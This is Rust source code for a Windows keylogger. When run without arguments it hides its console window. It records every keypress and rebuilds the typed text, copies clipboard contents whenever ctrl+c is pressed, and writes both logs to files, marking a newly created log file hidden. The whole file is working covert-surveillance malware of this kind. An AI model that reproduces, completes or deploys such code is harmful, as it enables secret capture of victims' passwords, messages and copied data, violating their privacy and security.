#[path = "dalog\\mod.rs"]
pub mod dalog;
use crate::dalog::*;
use winapi::um::synchapi::Sleep;
use winapi::um::wincon::FreeConsole;
use std::io::{stdout, Write, ErrorKind, Error};
use std::fs::{File, OpenOptions};
use std::thread;
use std::env;

/**Function writes logged data to a file on the disk.
 * Params:
 *  file_name: &str   {The name of the file.}
 *  content:   &str   {The content to write to the file.}
 *  bytes:     usize  {The number of bytes to be written to the file.}
 * Returns bool.
 */
fn write_to_disk(file_name: &str, content: &str, bytes: usize) -> bool {
  let append_file = OpenOptions::new().append(true).open(file_name);

  // Closure handles errors assicated with writing data to the file.
  let write_data = |handle: Result<File, Error>, content: &str, bytes: usize| -> bool {
    let mut output: bool = false;
    let mut bytes_written: usize = 0;
    let mut current_time = get_sys_time();

    current_time.push_str("\n\n");
    
    match handle {
      // If successful, the while loop makes sure that all data is written to the disk.
      Ok(mut f) => {
  
        current_time.push_str(content);
        current_time.push_str("\n");
        let new_bytes: usize = current_time.len();

        while bytes_written < new_bytes {
          match f.write(current_time.as_str().as_bytes()) {
            
            Ok(size) => { bytes_written += size },
            Err(e) => {
              if e.kind() != ErrorKind::Interrupted {
                break;
              }
            }
          }
        }
  
        if bytes_written >= bytes { output = true; }
      },
  
      Err(e) => {
        // If the file does not exist, we should attempt to create it.
        if e.kind() == ErrorKind::NotFound {
          let new_file = File::create(file_name);
  
          match new_file {
            Ok(_) => { set_file_hidden(true); },

            Err(e) => {
              if e.kind() == ErrorKind::PermissionDenied {
                println!("Unable to create file - Permission Denied");
              }
              else { println!("Unable to create file - {}", e.kind()); }
            }
          }
        }
      }
    }

    output
  };
  
  // If the closure function fails, we attempt to call it again.
  let mut ret = write_data(append_file, content, bytes);

  // Since the closure moves ownership of the handle, we need to open the file again.
  if ret == false {
    let try_append_file = OpenOptions::new().append(true).open(file_name);
    ret = write_data(try_append_file, content, bytes);
  }
  
  ret
}

#[allow(unused_assignments)]
fn main() {
  let mut dbg: bool = false;
  let mod_name = get_module_name();
  let args: Vec<String> = env::args().collect();

  if args.len() == 1 {
    unsafe { FreeConsole(); }
  }
  else if args.len() == 2 {
    let flag = &args[1];
    if flag.contains("--debug") { dbg = true; }
  }
  else {
    eprintln!(
      "Syntax:
        {}         {{Hides the console window}}
        {} --debug {{Shows the console window}}"
    , mod_name, mod_name);

    return;
  }

  let keys = KbKeys::new();                                 // Creates the structure that stores the virtual key codes.
  let mut buffer = "".to_owned();                           // The buffer that holds the data to be logged.
  let mut clip_buffer = "".to_owned();                      // Buffer holds data from the clipboard.
  let mut write_counter: u32 = 0;                           // Tells us how long until the buffer is emptied.
  let mut c_pos: usize = 0;                                 // Tells us where the user is typing on a line.

  println!("Start");
  loop {

    // Log the clipboard.
    if clip_buffer.len() > 0 {
      let release_clip = String::from(clip_buffer.as_str());          // Clipboard buffer as a slice.

      // Logs the clipboard to a file.
      thread::spawn(move || {
        let ret = write_to_disk(
          CLIP_FILENAME, &release_clip, release_clip.len()
        );

        println!("Result {}", ret);
      });

      // Clears the buffer.
      clip_buffer.clear();
    }

    if buffer.len() > 0 {
      write_counter += 20;
      
      // This condition will log the contents of the buffer to a file approx every 30 seconds.
      if write_counter >= RELEASE_BUFFER {
        let release_slice = String::from(buffer.as_str());

        thread::spawn(move || {
          write_to_disk(
            KEY_FILENAME, &release_slice.as_str(), release_slice.len()
          );
        });

        if dbg == true { println!("Successfully released buffer"); }

        buffer.clear();
        write_counter = 0;
        c_pos = 0;
      }
      
      // Checks if main buffer has stored 100 characters in memory.
      else if buffer.len() >= 256 {
        let buff_slice = String::from(buffer.as_str());

        // We then take the buffer to another thread and write it to disk.
        thread::spawn(move || {  
          write_to_disk(
            KEY_FILENAME, buff_slice.as_str(), buff_slice.len()
          );
        });

        // Clear the buffer to reqrite the same data over and over again.
        buffer.clear();
        write_counter = 0;
        c_pos = 0;
      }
    }

    if buffer.len() >= 256 { buffer.clear(); }

    // Returns the key that was pressed.
    let mut key = get_key_press(keys);
    if key.contains("NULL") == false {

      // Set the index 
      if key.contains("larrow") {
        if c_pos > 0 { c_pos -= 1; }
        key = "IGNORE";
      }
      else if key.contains("rarrow") {
        if c_pos < buffer.len() { c_pos += 1; }
        key = "IGNORE";
      }
      else if key.contains("ctrl+c") {
        clip_buffer = get_clipboard_data();
        key = "IGNORE";
      }

      // Add key to the buffer or remove it depending on the key.
      if key.contains("bspace") {
        
        // Keeps the user within the bounds of the string.
        if c_pos > 0 && buffer.len() > 0 {
          if c_pos == buffer.len() {
            buffer.pop();
            c_pos -= 1;
          }
          else if c_pos > 0 && c_pos < buffer.len() {
            buffer.remove(c_pos);
            c_pos -= 1;
          }
        }
        
        key = "IGNORE";
      }
      else {
        if c_pos > buffer.len() {
          c_pos = buffer.len();
        }

        // Keeps non character key presses out of the log.
        if key.contains("IGNORE") == false {
          buffer.insert_str(c_pos, key);
          c_pos += 1;
        }
      }

      if dbg == true {
        if key.contains("IGNORE") == false {
          print!("{}", key);
        }
      }

      key = "NULL";
      unsafe { Sleep(75); }
    }
    else {
      unsafe { Sleep (1); }
    }

    if dbg == true {
      println!("{} idx:{} len:{}", buffer, c_pos, buffer.len());
      if clip_buffer.len() > 0 { println!("Clipboard: {}", clip_buffer); }
    }
    // This line allows us to see text printed to the screen while typing.
    match stdout().flush() {
      Ok(_) => {},
      Err(e) => {
        println!("Unable to flush stdout with error {}", e.kind());
      }
    }
  }
}
